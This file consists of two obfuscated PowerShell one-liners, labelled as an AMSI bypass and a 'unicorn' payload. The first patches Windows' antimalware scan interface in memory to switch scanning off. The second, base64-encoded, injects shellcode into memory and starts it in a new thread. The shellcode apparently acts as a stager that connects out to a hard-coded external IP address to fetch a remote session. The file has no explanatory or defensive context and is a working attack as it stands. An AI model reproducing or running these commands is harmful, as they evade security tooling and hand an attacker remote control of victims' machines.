# AMSI bypass code - run in same process as unicorn second stage
powershell /w 1 /C "sv cx -;sv YOY ec;sv zoL ((gv cx).value.toString()+(gv YOY).value.toString());powershell (gv zoL).value.toString() ('JABRAFIARABuAGUAQgAgAD0AIABAACIACgB1AHMAaQBuAGcAIABTAHkAcwB0AGUAbQA7AHUAcwBpAG4AZwAgAFMAeQBzAHQAZQBtAC4AUgB1AG4AdABpAG0AZQAuAEkAbgB0AGUAcgBvAHAAUwBlAHIAdgBpAGMAZQBzADsAcAB1AGIAbABpAGMAIABjAGwAYQBzAHMAIABXAGkAbgAzADIAIAB7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQAiACsAIgBsACIAKwAiADMAMgAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAEcAZQB0AFAAcgBvAGMAQQBkAGQAcgBlAHMAcwAoAEkAbgB0AFAAdAByACAAaABNAG8AZAB1AGwAZQAsACAAcwB0AHIAaQBuAGcAIABwAHIAbwBjAE4AYQBtAGUAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQAiACsAIgBsACIAKwAiADMAMgAiACkAXQAgAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAATABvAGEAZABMAGkAYgByAGEAcgB5ACgAcwB0AHIAaQBuAGcAIABuAGEAbQBlACkAOwBbAEQAbABsAEkAbQBwAG8AcgB0ACgAIgBrAGUAcgBuAGUAIgArACIAbAAiACsAIgAzADIAIgApAF0AIABwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABiAG8AbwBsACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAQQBkAGQAcgBlAHMAcwAsACAAVQBJAG4AdABQAHQAcgAgAGQAdwBTAGkAegBlACwAIAB1AGkAbgB0ACAAZgBsAE4AZQB3AFAAcgBvAHQAZQBjAHQALAAgAG8AdQB0ACAAdQBpAG4AdAAgAGwAcABmAGwATwBsAGQAUAByAG8AdABlAGMAdAApADsAfQAKACIAQAAKAEEAZABkAC0AVAB5AHAAZQAgACQAUQBSAEQAbgBlAEIAOwAkAGYAUwBnAHUAdwAgAD0AIABbAFcAaQBuADMAMgBdADoAOgBHAGUAdABQAHIAbwBjAEEAZABkAHIAZQBzAHMAKABbAFcAaQBuADMAMgBdADoAOgBMAG8AYQBkAEwAaQBiAHIAYQByAHkAKAAiAEEAbQBzACIAKwAiAGkAIgArACIALgBkAGwAbAAiACkALAAgACIAQQBtAHMAIgArACIAaQAiACsAIgBTAGMAIgArACIAYQAiACsAIgBuAEIAdQBmAGYAZQByACIAKQA7ACQAWQBwAFIAUABuAFcAeABaACAAPQAgADAAOwBbAFcAaQBuADMAMgBdADoAOgBWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKAAkAGYAUwBnAHUAdwAsACAAWwB1AGkAbgB0ADMAMgBdAFsAdQBpAG4AdAAzADIAXQA1ACwAIAAwAHgANAAwACwAIABbAHIAZQBmAF0AJABZAHAAUgBQAG4AVwB4AFoAKQA7ACQAbwBOAHkAcQB6AHMAIAA9ACAAKAAiAH0AeABGAGkAcABVAHcAWgBaACwAIAB9AHgARAB3AHEAZgBpAEcAVQB3ACwAIAB9AHgAfQB9ACwAIAB9AHgAfQA3ACwAIAB9AHgAOAB9ACwAIAB9AHgAQwAzACIAKQAuAHIAZQBwAGwAYQBjAGUAKAAiAEQAdwBxAGYAaQBHAFUAdwAiACwAIAAiADUANwAiACkALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAgACIAMAAiACkALgByAGUAcABsAGEAYwBlACgAIgBGAGkAcABVAHcAWgBaACIALAAgACIAQgA4ACIAKQA7ACQAbwBOAHkAcQB6AHMAIAA9ACAAWwBCAHkAdABlAFsAXQBdACgAJABvAE4AeQBxAHoAcwApAC4AcwBwAGwAaQB0ACgAIgAsACIAKQA7AFsAUwB5AHMAdABlAG0ALgBSAHUAbgB0AGkAbQBlAC4ASQBuAHQAZQByAG8AcABTAGUAcgB2AGkAYwBlAHMALgBNAGEAcgBzAGgAYQBsAF0AOgA6AEMAbwBwAHkAKAAkAG8ATgB5AHEAegBzACwAIAAwACwAIAAkAGYAUwBnAHUAdwAsACAANgApAA==')"

# actual unicorn payload
powershell /w 1 /C "sv cx -;sv YOY ec;sv zoL ((gv cx).value.toString()+(gv YOY).value.toString());powershell (gv zoL).value.toString() ('JABsAFoAPQAnACQASwBjAD0AJwAnAFsARABsAGwASQBtAHAAbwByAHQAKAAoACIAbQAiACsAIgBzACIAKwAiAHYAYwByAHQALgBkAGwAbAAiACkAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAYwBhAGwAbABvAGMAKAB1AGkAbgB0ACAAZAB3AFMAaQB6AGUALAAgAHUAaQBuAHQAIABhAG0AbwB1AG4AdAApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAawBlAHIAbgBlAGwAMwAyAC4AZAAiACsAIgBsACIAKwAiAGwAIgApAF0AcAB1AGIAbABpAGMAIABzAHQAYQB0AGkAYwAgAGUAeAB0AGUAcgBuACAASQBuAHQAUAB0AHIAIABDAHIAZQBhAHQAZQBUAGgAcgBlAGEAZAAoAEkAbgB0AFAAdAByACAAbABwAFQAaAByAGUAYQBkAEEAdAB0AHIAaQBiAHUAdABlAHMALAAgAHUAaQBuAHQAIABkAHcAUwB0AGEAYwBrAFMAaQB6AGUALAAgAEkAbgB0AFAAdAByACAAbABwAFMAdABhAHIAdABBAGQAZAByAGUAcwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABQAGEAcgBhAG0AZQB0AGUAcgAsACAAdQBpAG4AdAAgAGQAdwBDAHIAZQBhAHQAaQBvAG4ARgBsAGEAZwBzACwAIABJAG4AdABQAHQAcgAgAGwAcABUAGgAcgBlAGEAZABJAGQAKQA7AFsARABsAGwASQBtAHAAbwByAHQAKAAiAGsAZQByAG4AZQBsADMAMgAuAGQAIgArACIAbAAiACsAIgBsACIAKQBdAHAAdQBiAGwAaQBjACAAcwB0AGEAdABpAGMAIABlAHgAdABlAHIAbgAgAEkAbgB0AFAAdAByACAAVgBpAHIAdAB1AGEAbABQAHIAbwB0AGUAYwB0ACgASQBuAHQAUAB0AHIAIABsAHAAUwB0AGEAcgB0AEEAZABkAHIAZQBzAHMALAAgAHUAaQBuAHQAIABkAHcAUwBpAHoAZQAsACAAdQBpAG4AdAAgAGYAbABOAGUAdwBQAHIAbwB0AGUAYwB0ACwAIABvAHUAdAAgAHUAaQBuAHQAIABYAHUATQApADsAWwBEAGwAbABJAG0AcABvAHIAdAAoACIAbQAiACsAIgBzACIAKwAiAHYAYwByAHQALgBkAGwAbAAiACkAXQBwAHUAYgBsAGkAYwAgAHMAdABhAHQAaQBjACAAZQB4AHQAZQByAG4AIABJAG4AdABQAHQAcgAgAG0AZQBtAHMAZQB0ACgASQBuAHQAUAB0AHIAIABkAGUAcwB0ACwAIAB1AGkAbgB0ACAAcwByAGMALAAgAHUAaQBuAHQAIABjAG8AdQBuAHQAKQA7ACcAJwA7ACQAVgBIAD0AIgB9AGUAOAAsAH0AOABmACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADAALAB9ADMAMQAsAH0AZAAyACwAfQA4ADkALAB9AGUANQAsAH0ANgA0ACwAfQA4AGIALAB9ADUAMgAsAH0AMwAwACwAfQA4AGIALAB9ADUAMgAsAH0AMABjACwAfQA4AGIALAB9ADUAMgAsAH0AMQA0ACwAfQAwAGYALAB9AGIANwAsAH0ANABhACwAfQAyADYALAB9ADMAMQAsAH0AZgBmACwAfQA4AGIALAB9ADcAMgAsAH0AMgA4ACwAfQAzADEALAB9AGMAMAAsAH0AYQBjACwAfQAzAGMALAB9ADYAMQAsAH0ANwBjACwAfQAwADIALAB9ADIAYwAsAH0AMgAwACwAfQBjADEALAB9AGMAZgAsAH0AMABkACwAfQAwADEALAB9AGMANwAsAH0ANAA5ACwAfQA3ADUALAB9AGUAZgAsAH0ANQAyACwAfQA1ADcALAB9ADgAYgAsAH0ANQAyACwAfQAxADAALAB9ADgAYgAsAH0ANAAyACwAfQAzAGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAMAAsAH0ANwA4ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQA0AGMALAB9ADAAMQAsAH0AZAAwACwAfQA4AGIALAB9ADQAOAAsAH0AMQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgAwACwAfQA1ADAALAB9ADAAMQAsAH0AZAAzACwAfQA4ADUALAB9AGMAOQAsAH0ANwA0ACwAfQAzAGMALAB9ADMAMQAsAH0AZgBmACwAfQA0ADkALAB9ADgAYgAsAH0AMwA0ACwAfQA4AGIALAB9ADAAMQAsAH0AZAA2ACwAfQAzADEALAB9AGMAMAAsAH0AYwAxACwAfQBjAGYALAB9ADAAZAAsAH0AYQBjACwAfQAwADEALAB9AGMANwAsAH0AMwA4ACwAfQBlADAALAB9ADcANQAsAH0AZgA0ACwAfQAwADMALAB9ADcAZAAsAH0AZgA4ACwAfQAzAGIALAB9ADcAZAAsAH0AMgA0ACwAfQA3ADUALAB9AGUAMAAsAH0ANQA4ACwAfQA4AGIALAB9ADUAOAAsAH0AMgA0ACwAfQAwADEALAB9AGQAMwAsAH0ANgA2ACwAfQA4AGIALAB9ADAAYwAsAH0ANABiACwAfQA4AGIALAB9ADUAOAAsAH0AMQBjACwAfQAwADEALAB9AGQAMwAsAH0AOABiACwAfQAwADQALAB9ADgAYgAsAH0AMAAxACwAfQBkADAALAB9ADgAOQAsAH0ANAA0ACwAfQAyADQALAB9ADIANAAsAH0ANQBiACwAfQA1AGIALAB9ADYAMQAsAH0ANQA5ACwAfQA1AGEALAB9ADUAMQAsAH0AZgBmACwAfQBlADAALAB9ADUAOAAsAH0ANQBmACwAfQA1AGEALAB9ADgAYgAsAH0AMQAyACwAfQBlADkALAB9ADgAMAAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0ANQBkACwAfQA2ADgALAB9ADYAZQAsAH0ANgA1ACwAfQA3ADQALAB9ADAAMAAsAH0ANgA4ACwAfQA3ADcALAB9ADYAOQAsAH0ANgBlACwAfQA2ADkALAB9ADUANAAsAH0ANgA4ACwAfQA0AGMALAB9ADcANwAsAH0AMgA2ACwAfQAwADcALAB9AGYAZgAsAH0AZAA1ACwAfQAzADEALAB9AGQAYgAsAH0ANQAzACwAfQA1ADMALAB9ADUAMwAsAH0ANQAzACwAfQA1ADMALAB9ADYAOAAsAH0AMwBhACwAfQA1ADYALAB9ADcAOQAsAH0AYQA3ACwAfQBmAGYALAB9AGQANQAsAH0ANQAzACwAfQA1ADMALAB9ADYAYQAsAH0AMAAzACwAfQA1ADMALAB9ADUAMwAsAH0ANgBhACwAfQA1ADAALAB9AGUAOAAsAH0AYgAwACwAfQAwADAALAB9ADAAMAAsAH0AMAAwACwAfQAyAGYALAB9ADcANwAsAH0ANwA4ACwAfQA2AGUALAB9ADcAYQAsAH0ANABjACwAfQA1ADQALAB9ADYANQAsAH0AMwAwACwAfQA3ADUALAB9ADMANgAsAH0ANAAzACwAfQA2AGIALAB9ADYANQAsAH0ANgAxACwAfQA1ADYALAB9ADMANAAsAH0ANwA4ACwAfQA2AGIALAB9ADQAYgAsAH0AMwAzACwAfQA0AGMALAB9ADcANwAsAH0ANQA1ACwAfQAzADMALAB9ADUANwAsAH0ANABiACwAfQA3ADQALAB9ADYAYwAsAH0ANwA5ACwAfQAwADAALAB9ADUAMAAsAH0ANgA4ACwAfQA1ADcALAB9ADgAOQAsAH0AOQBmACwAfQBjADYALAB9AGYAZgAsAH0AZAA1ACwAfQA4ADkALAB9AGMANgAsAH0ANQAzACwAfQA2ADgALAB9ADAAMAAsAH0AMwAyACwAfQBlADgALAB9ADgANAAsAH0ANQAzACwAfQA1ADMALAB9ADUAMwAsAH0ANQA3ACwAfQA1ADMALAB9ADUANgAsAH0ANgA4ACwAfQBlAGIALAB9ADUANQAsAH0AMgBlACwAfQAzAGIALAB9AGYAZgAsAH0AZAA1ACwAfQA5ADYALAB9ADYAYQAsAH0AM'+'ABhACwAfQA1AGYALAB9ADYAOAAsAH0AOAAwACwAfQAzADMALAB9ADAAMAAsAH0AMAAwACwAfQA4ADkALAB9AGUAMAAsAH0ANgBhACwAfQAwADQALAB9ADUAMAAsAH0ANgBhACwAfQAxAGYALAB9ADUANgAsAH0ANgA4ACwAfQA3ADUALAB9ADQANgAsAH0AOQBlACwAfQA4ADYALAB9AGYAZgAsAH0AZAA1ACwAfQA1ADMALAB9ADUAMwAsAH0ANQAzACwAfQA1ADMALAB9ADUANgAsAH0ANgA4ACwAfQAyAGQALAB9ADAANgAsAH0AMQA4ACwAfQA3AGIALAB9AGYAZgAsAH0AZAA1ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA1ACwAfQAxADYALAB9ADYAOAAsAH0AOAA4ACwAfQAxADMALAB9ADAAMAAsAH0AMAAwACwAfQA2ADgALAB9ADQANAAsAH0AZgAwACwAfQAzADUALAB9AGUAMAAsAH0AZgBmACwAfQBkADUALAB9ADQAZgAsAH0ANwA1ACwAfQBjAGQALAB9ADYAOAAsAH0AZgAwACwAfQBiADUALAB9AGEAMgAsAH0ANQA2ACwAfQBmAGYALAB9AGQANQAsAH0ANgBhACwAfQA0ADAALAB9ADYAOAAsAH0AMAAwACwAfQAxADAALAB9ADAAMAAsAH0AMAAwACwAfQA2ADgALAB9ADAAMAAsAH0AMAAwACwAfQA0ADAALAB9ADAAMAAsAH0ANQAzACwAfQA2ADgALAB9ADUAOAAsAH0AYQA0ACwAfQA1ADMALAB9AGUANQAsAH0AZgBmACwAfQBkADUALAB9ADkAMwAsAH0ANQAzACwAfQA1ADMALAB9ADgAOQAsAH0AZQA3ACwAfQA1ADcALAB9ADYAOAAsAH0AMAAwACwAfQAyADAALAB9ADAAMAAsAH0AMAAwACwAfQA1ADMALAB9ADUANgAsAH0ANgA4ACwAfQAxADIALAB9ADkANgAsAH0AOAA5ACwAfQBlADIALAB9AGYAZgAsAH0AZAA1ACwAfQA4ADUALAB9AGMAMAAsAH0ANwA0ACwAfQBjAGQALAB9ADgAYgAsAH0AMAA3ACwAfQAwADEALAB9AGMAMwAsAH0AOAA1ACwAfQBjADAALAB9ADcANQAsAH0AZQA1ACwAfQA1ADgALAB9AGMAMwAsAH0ANQBmACwAfQBlADgALAB9ADYAOQAsAH0AZgBmACwAfQBmAGYALAB9AGYAZgAsAH0AMwA1ACwAfQAzADIALAB9ADIAZQAsAH0AMwA0ACwAfQAzADkALAB9ADIAZQAsAH0AMwAxACwAfQAzADEALAB9ADMANwAsAH0AMgBlACwAfQAzADEALAB9ADMANgAsAH0AMwA0ACwAfQAwADAAIgA7ACQATABSAD0AQQBkAGQALQBUAHkAcABlACAALQBwAGEAcwBzACAALQBtACAAJABLAGMAIAAtAE4AYQBtAGUAIAAiAEUAZgAiACAALQBuAGEAbQBlAHMAIAByAE0AbgA7ACQATABSAD0AJABMAFIALgByAGUAcABsAGEAYwBlACgAIgByAE0AbgAiACwAIAAiAFcAaQBuADMAMgBGAHUAbgBjAHQAaQBvACIAKwAiAG4AIgArACIAcwAiACkAOwBbAGIAeQB0AGUAWwBdAF0AJABWAEgAIAA9ACAAJABWAEgALgByAGUAcABsAGEAYwBlACgAIgB9ACIALAAiAHUASAByAGcAeAAiACkALgByAGUAcABsAGEAYwBlACgAIgB1AEgAcgBnACIALAAgACIAMAAiACkALgBTAHAAbABpAHQAKAAiACwAIgApADsAJABXAGMAPQAwAHgAMQAwADAANwA7AGkAZgAgACgAJABWAEgALgBMACAALQBnAHQAIAAwAHgAMQAwADAANwApAHsAJABXAGMAPQAkAFYASAAuAEwAfQA7ACQAdQBzAD0AJABMAFIAOgA6AGMAYQBsAGwAbwBjACgAMAB4ADEAMAAwADcALAAgADEAKQA7AFsAVQBJAG4AdAA2ADQAXQAkAFgAdQBNACAAPQAgADAAOwBmAG8AcgAoACQAcABZAD0AMAA7ACQAcABZACAALQBsAGUAKAAkAFYASAAuAEwAZQBuAGcAdABoAC0AMQApADsAJABwAFkAKwArACkAewAkAEwAUgA6ADoAbQBlAG0AcwBlAHQAKABbAEkAbgB0AFAAdAByAF0AKAAkAHUAcwAuAFQAbwBJAG4AdAAzADIAKAApACsAJABwAFkAKQAsACAAJABWAEgAWwAkAHAAWQBdACwAIAAxACkAfQA7ACQATABSADoAOgBWAGkAcgB0AHUAYQBsAFAAcgBvAHQAZQBjAHQAKAAkAHUAcwAsACAAMAB4ADEAMAAwADcALAAgADAAeAA0ADAALAAgAFsAUgBlAGYAXQAkAFgAdQBNACkAOwAkAG8AbAB3AD0AWwBpAG4AdABdADAAeAAwADAAOwAkAEwAUgA6ADoAQwByAGUAYQB0AGUAVABoAHIAZQBhAGQAKABbAGkAbgB0AF0AMAAsACQAbwBsAHcALAAkAHUAcwAsADAALAAwACwAMQAtADEAKQA7ACcAOwAkAFQAUAA9AFsAQwBvAG4AdgBlAHIAdABdADoAOgBUAG8AQgBhAHMAZQA2ADQAUwB0AHIAaQBuAGcAKABbAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBuAGkAYwBvAGQAZQAuAEcAZQB0AEIAeQB0AGUAcwAoACQAbABaACkAKQA7ACQAcAByAD0AIgBwAG8AdwBlAHIAcwBoAGUAbABsACIAOwAkAEQAUgA9ACIAVwBpAG4AZABvAHcAcwAiADsAJABnAGcAdwBIACAAPQAgACIAQwA6AFwAJABEAFIAXAB6AGQASQBxAHEAQgBRAE0AXAAkAEQAUgAkAHAAcgBcAHYAMQAuADAAXAAkAHAAcgAiADsAJABnAGcAdwBIACAAPQAgACQAZwBnAHcASAAuAHIAZQBwAGwAYQBjAGUAKAAiAHoAZABJAHEAIgAsACAAIgBzAHkAcwAiACkAOwAkAGcAZwB3AEgAIAA9ACAAJABnAGcAdwBIAC4AcgBlAHAAbABhAGMAZQAoACIAcQBCAFEATQAiACwAIAAiAHcAbwB3ADYANAAiACkAOwAkAEoAaABCACAAPQAgACcAVAAiACsAIgByACIAKwAiAHUAZQAnADsAaQBmACgAWwBlAG4AdgBpAHIAbwBuAG0AZQBuAHQAXQA6ADoASQBzADYANABCAGkAdABPAHAAZQByAGEAdABpAG4AZwBTAHkAcwB0AGUAbQAgAC0AZQBxACAAJwAkAEoAaABCACcAKQB7ACQAcAByAD0AIAAkAGcAZwB3AEgAfQA7ACQAcAByAD0AIgAgACQAcAByACAAQwBtAHAAQQAgACQAVABQACIAOwAkAHAAcgA9ACQAcAByAC4AcgBlAHAAbABhAGMAZQAoACIAQwBtAHAAQQAiACwAIAAiAC0AbgBvAGUAeABpAHQAIAAtAGUAIgApADsAaQBlAHgAIAAkAHAAcgA=')"